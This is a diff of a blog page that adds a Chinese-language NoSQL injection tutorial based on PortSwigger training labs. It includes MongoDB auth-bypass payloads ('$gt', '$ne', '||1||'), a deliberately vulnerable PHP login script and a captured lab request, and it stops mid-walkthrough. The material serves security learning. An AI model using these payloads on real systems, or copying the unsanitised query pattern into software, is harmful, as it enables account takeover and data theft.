@@ -7,38 +7,38 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>Nosql Inject - DELETE</title><meta name="Description" content=""><meta property="og:title" content="Nosql Inject" />
+    <title>nosql-inject(mangodb and influxdb) - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="nosql-inject(mangodb and influxdb)" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://ML-hacker.github.io/posts/nosql-inject/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-06T14:35:43+08:00" />
-<meta property="article:modified_time" content="2024-02-06T14:35:43+08:00" />
+<meta property="article:published_time" content="2024-02-01T23:27:59+08:00" />
+<meta property="article:modified_time" content="2024-02-01T23:27:59+08:00" />
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Nosql Inject"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="nosql-inject(mangodb and influxdb)"/>
 <meta name="twitter:description" content=""/>
-<meta name="application-name" content="DELETE">
-<meta name="apple-mobile-web-app-title" content="DELETE">
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/nosql-inject/" /><link rel="prev" href="http://ML-hacker.github.io/posts/n1start/" /><link rel="next" href="http://ML-hacker.github.io/posts/phar/" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/nosql-inject/" /><link rel="prev" href="http://ML-hacker.github.io/posts/ctfshow-yuandan/" /><link rel="next" href="http://ML-hacker.github.io/posts/sql-rce/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Nosql Inject",
+        "headline": "nosql-inject(mangodb and influxdb)",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ML-hacker.github.io/posts/nosql-inject/"
-        },"genre": "posts","wordcount":  0 ,
-        "url": "http://ML-hacker.github.io/posts/nosql-inject/","datePublished": "2024-02-06T14:35:43+08:00","dateModified": "2024-02-06T14:35:43+08:00","publisher": {
+        },"genre": "posts","keywords": "NOSQL","wordcount":  1871 ,
+        "url": "http://ML-hacker.github.io/posts/nosql-inject/","datePublished": "2024-02-01T23:27:59+08:00","dateModified": "2024-02-01T23:27:59+08:00","publisher": {
             "@type": "Organization",
-            "name": "Author"},"author": {
+            "name": "Delete"},"author": {
                 "@type": "Person",
-                "name": "Author"
+                "name": "Delete"
             },"description": ""
     }
     </script></head>
@@ -56,10 +56,21 @@
     <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="DELETE"><span id="desktop-header-typeit" class="typeit"></span></a>
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                     <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                         <option value="light">Light</option>
@@ -74,13 +85,29 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="DELETE"><span id="mobile-header-typeit" class="typeit"></span></a>
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
                 <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                     <option value="light">Light</option>
@@ -98,18 +125,1446 @@
     <div id="search-dropdown-mobile"></div>
 </div>
 <main class="main">
-            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Nosql Inject</h1><div class="post-meta">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">nosql-inject(mangodb and influxdb)</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
-                </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;0 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;0 minutes&nbsp;</div>
-        </div><div class="content" id="content"></div>
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-01">2024-02-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-01">2024-02-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1871 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="nosql-inject" class="headerLink">
+    <a href="#nosql-inject" class="header-mark"></a>NoSQL Inject</h1><p>NoSQL(NOT ONLY SQL)，它和我们常见的sql注入很像。
+它的危害有：</p>
+<ul>
+<li>绕过身份验证或保护机制。</li>
+<li>提取或编辑数据。</li>
+<li>导致拒绝服务。</li>
+<li>在服务器上执行代码。
+其实注入的本质都是一样的，只是语法有些不一样</li>
+</ul>
+<h2 id="0x001-nosql-database" class="headerLink">
+    <a href="#0x001-nosql-database" class="header-mark"></a>0x001 NoSQL database</h2><p>NoSQL 数据库以传统 SQL 关系表以外的格式存储和检索数据。它们旨在处理大量非结构化或半结构化数据。因此，它们通常比 SQL 具有更少的关系约束和一致性检查，并且在可扩展性、灵活性和性能方面具有显着的优势。</p>
+<p>与 SQL 数据库一样，用户使用应用程序传递到数据库的查询与 NoSQL 数据库中的数据进行交互。然而，不同的NoSQL数据库使用多种查询语言，而不是像SQL（结构化查询语言）这样的通用标准。这可能是自定义查询语言或通用语言（如 XML 或 JSON）。（所以黑客可以使用过程性的语言而不是sql来进行攻击，并且可能会比传统的sql注入更具有危害性。）</p>
+<p>NoSQL 数据库不支持一种标准化查询语言，因此允许的确切查询取决于：</p>
+<ul>
+<li><strong>数据库引擎</strong>— 例如 MongoDB、Cassandra、Redis 或 Google Bigtable</li>
+<li><strong>编程语言</strong>— 例如 Python、PHP</li>
+<li><strong>开发框架</strong>——例如 Angular、Node.js</li>
+</ul>
+<h2 id="0x002nosql-database-models" class="headerLink">
+    <a href="#0x002nosql-database-models" class="header-mark"></a>0x002NoSQL database models</h2><table>
+<thead>
+<tr>
+<th style="text-align:left">类型</th>
+<th style="text-align:right">部分代表</th>
+<th style="text-align:center">特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">列存储</td>
+<td style="text-align:right">Hbase<br><br>Cassandra<br><br>Hypertable</td>
+<td style="text-align:center">顾名思义，是按列存储数据的。最大的特点是方便存储结构化和半结构化数据，方便做数据压缩，对针对某一列或者某几列的查询有非常大的IO优势。</td>
+</tr>
+<tr>
+<td style="text-align:left">文档存储</td>
+<td style="text-align:right">MongoDB<br><br>CouchDB</td>
+<td style="text-align:center">文档存储一般用类似json的格式存储，存储的内容是文档型的。这样也就有机会对某些字段建立索引，实现关系数据库的某些功能。</td>
+</tr>
+<tr>
+<td style="text-align:left">key-value存储</td>
+<td style="text-align:right">Tokyo Cabinet / Tyrant<br><br>Berkeley DB<br><br>MemcacheDB<br><br>Redis</td>
+<td style="text-align:center">可以通过key快速查询到其value。一般来说，存储不管value的格式，照单全收。（Redis包含了其他功能）</td>
+</tr>
+<tr>
+<td style="text-align:left">图存储</td>
+<td style="text-align:right">Neo4J<br><br>FlockDB</td>
+<td style="text-align:center">图形关系的最佳存储。使用传统关系数据库来解决的话性能低下，而且设计使用不方便。</td>
+</tr>
+<tr>
+<td style="text-align:left">对象存储</td>
+<td style="text-align:right">db4o<br><br>Versant</td>
+<td style="text-align:center">通过类似面向对象语言的语法操作数据库，通过对象的方式存取数据。</td>
+</tr>
+<tr>
+<td style="text-align:left">xml数据库</td>
+<td style="text-align:right">Berkeley DB XML<br><br>BaseX</td>
+<td style="text-align:center">高效的存储XML数据，并支持XML的内部查询语法，比如XQuery,Xpath。</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x003注入的类型" class="headerLink">
+    <a href="#0x003%e6%b3%a8%e5%85%a5%e7%9a%84%e7%b1%bb%e5%9e%8b" class="header-mark"></a>0x003注入的类型</h2><p>有两种 NoSQL 注入分类的方式：</p>
+<p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<ul>
+<li><strong>重言式注入</strong></li>
+</ul>
+<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<ul>
+<li><strong>联合查询注入</strong></li>
+</ul>
+<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<ul>
+<li><strong>JavaScript 注入</strong></li>
+</ul>
+<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<ul>
+<li><strong>盲注</strong></li>
+</ul>
+<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。
+在portswigger中的解释：</p>
+<ul>
+<li>语法注入</li>
+<li>当您可以破坏 NoSQL 查询语法，从而使您能够注入自己的有效负载时，就会发生这种情况。该方法与 SQL 注入中使用的方法类似。然而，攻击的性质差异很大，因为 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构。</li>
+<li>运算符注入 - 当您可以使用 NoSQL 查询运算符来操作查询时，就会发生这种情况。</li>
+</ul>
+<h2 id="0x004判断是否存在注入点" class="headerLink">
+    <a href="#0x004%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8%e6%b3%a8%e5%85%a5%e7%82%b9" class="header-mark"></a>0x004判断是否存在注入点</h2><p>这里我就拿portswigger的在线lab做例子，就不额外搭建环境了
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nsql1.png"
+        srcset="/img/nosql-inject/nsql1.png, /img/nosql-inject/nsql1.png 1.5x, /img/nosql-inject/nsql1.png 2x"
+        alt="/img/nosql-inject/nsql1.png"
+        title="/img/nosql-inject/nsql1.png" ></figure>
+这里首先是一个商城的界面，随便点击一个category
+url: /filter?category=Accessories
+可以看见这里有类似于查询的意思，我们输入一个单引号试试
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql2.png"
+        srcset="/img/nosql-inject/nosql2.png, /img/nosql-inject/nosql2.png 1.5x, /img/nosql-inject/nosql2.png 2x"
+        alt="/img/nosql-inject/nosql2.png"
+        title="/img/nosql-inject/nosql2.png" ></figure>
+可以看见报错了，报错内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">Command</span> <span class="n">failed</span> <span class="n">with</span> <span class="n">error</span> <span class="mi">139</span> <span class="p">(</span><span class="n">JSInterpreterFailure</span><span class="p">)</span><span class="o">:</span> <span class="err">&#39;</span><span class="nl">SyntaxError</span><span class="p">:</span> <span class="n">unterminated</span> <span class="n">string</span> <span class="nl">literal</span> <span class="p">:</span> <span class="n">functionExpressionParser</span><span class="err">@</span><span class="n">src</span><span class="o">/</span><span class="n">mongo</span><span class="o">/</span><span class="n">scripting</span><span class="o">/</span><span class="n">mozjs</span><span class="o">/</span><span class="n">mongohelpers</span><span class="p">.</span><span class="nl">js</span><span class="p">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">25</span> <span class="err">&#39;</span> <span class="n">on</span> <span class="n">server</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mf">27017.</span> <span class="n">The</span> <span class="n">full</span> <span class="n">response</span> <span class="n">is</span> <span class="p">{</span><span class="s">&#34;ok&#34;</span><span class="o">:</span> <span class="mf">0.0</span><span class="p">,</span> <span class="s">&#34;errmsg&#34;</span><span class="o">:</span> <span class="s">&#34;SyntaxError: unterminated string literal :</span><span class="se">\n</span><span class="s">functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;code&#34;</span><span class="o">:</span> <span class="mi">139</span><span class="p">,</span> <span class="s">&#34;codeName&#34;</span><span class="o">:</span> <span class="s">&#34;JSInterpreterFailure&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很明显可以看见mogodb的操作。那么我们还要判断他是否会把url的内容带入数据库查询，所以我们构造<code>Accessories'&amp;&amp; 0 &amp;&amp; 'x</code>
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql3.png"
+        srcset="/img/nosql-inject/nosql3.png, /img/nosql-inject/nosql3.png 1.5x, /img/nosql-inject/nosql3.png 2x"
+        alt="/img/nosql-inject/nosql3.png"
+        title="/img/nosql-inject/nosql3.png" ></figure>
+可以看见是返回正常的，说明这里存在注入,我们再构造一次为真的条件，就会发现会返回所有商品信息，playload:https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=accessories%27%7c%7c1%7c%7c%27</p>
+<p>也就是accessories&rsquo;||&lsquo;1&rsquo;==&lsquo;1&rsquo;
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql4.png"
+        srcset="/img/nosql-inject/nosql4.png, /img/nosql-inject/nosql4.png 1.5x, /img/nosql-inject/nosql4.png 2x"
+        alt="/img/nosql-inject/nosql4.png"
+        title="/img/nosql-inject/nosql4.png" ></figure></p>
+<h2 id="inject-function" class="headerLink">
+    <a href="#inject-function" class="header-mark"></a>Inject function</h2><h3 id="重言式注入" class="headerLink">
+    <a href="#%e9%87%8d%e8%a8%80%e5%bc%8f%e6%b3%a8%e5%85%a5" class="header-mark"></a>重言式注入</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="nx">userInputUsername</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="o">:</span> <span class="nx">userInputPassword</span><span class="p">});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击者可以构造{&quot;$gt&quot;:&quot;&quot;}来进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span><span class="s2">&#34;username&#34;</span><span class="o">:</span> <span class="s2">&#34;administrator&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="o">:</span> <span class="p">{</span><span class="s2">&#34;</span><span class="si">$gt</span><span class="s2">&#34;</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">}});</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>MongoDB 中的运算<code>&quot;$gt&quot;</code>符的意思是“大于”。通过将该值设置为空字符串，攻击者可以绕过身份验证，因为查询将返回用户名和密码大于空字符串的第一个用户。</p>
+<p>这里也放一下Marcus_Holloway师傅的index.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$password</span>
+</span></span><span class="line"><span class="cl"><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>正常用户登录的时候</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">username</span><span class="o">=</span><span class="n">whoami</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">657260</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其实执行的命令和我上面举的例子是一样的
+如果这个时候传参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">username</span><span class="p">[</span><span class="err">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="n">password</span><span class="p">[</span><span class="err">$</span><span class="n">ne</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样也可构造出一个true，也就是和我们sql注入中的万能密码<strong>admin&rsquo; or 1=1&ndash;+</strong> 一个原理，就是构造永真条件</p>
+<h3 id="运算符注入" class="headerLink">
+    <a href="#%e8%bf%90%e7%ae%97%e7%ac%a6%e6%b3%a8%e5%85%a5" class="header-mark"></a>运算符注入</h3><p>NoSQL 数据库经常使用查询运算符，它提供了指定数据必须满足的条件才能包含在查询结果中的方法。 MongoDB 查询运算符的示例包括：</p>
+<ul>
+<li><code>$where</code>- 匹配满足 JavaScript 表达式的文档。</li>
+<li><code>$ne</code>- 匹配所有不等于指定值的值。</li>
+<li><code>$in</code>- 匹配数组中指定的所有值。</li>
+<li><code>$regex</code>- 选择值与指定正则表达式匹配的文档。</li>
+</ul>
+<p>对于基于 URL 的输入，您可以通过 URL 参数插入查询运算符。例如，<code>username=wiener</code>变为 <code>username[$ne]=invalid</code>.如果这不起作用，您可以尝试以下操作：</p>
+<ol>
+<li>将请求方法从 转换<code>GET</code>为<code>POST</code>.</li>
+<li>将<code>Content-Type</code>标题更改为<code>application/json</code>.</li>
+<li>将 JSON 添加到消息正文。</li>
+<li>在 JSON 中注入查询运算符。
+进来有个login页面
+<figure><img
+        
+        loading="lazy"
+        src="/img/nosql-inject/nosql5.png"
+        srcset="/img/nosql-inject/nosql5.png, /img/nosql-inject/nosql5.png 1.5x, /img/nosql-inject/nosql5.png 2x"
+        alt="/img/nosql-inject/nosql5.png"
+        title="/img/nosql-inject/nosql5.png" ></figure>
+抓个包看看</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /login HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: xxxxxxxxxxxxx.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=djMoS9NuJRKCDsBfzRpHwzdkyy9EqZEC
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://xxxxxxxxxxx7.web-security-academy.net/login
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 39
+</span></span><span class="line"><span class="cl">Origin: https://xxxxxxxxxxx.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;admin&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看见最后面传了json格式的文件
+我们看见题目要求登录admin的账户，所以就构造playload
+playload：
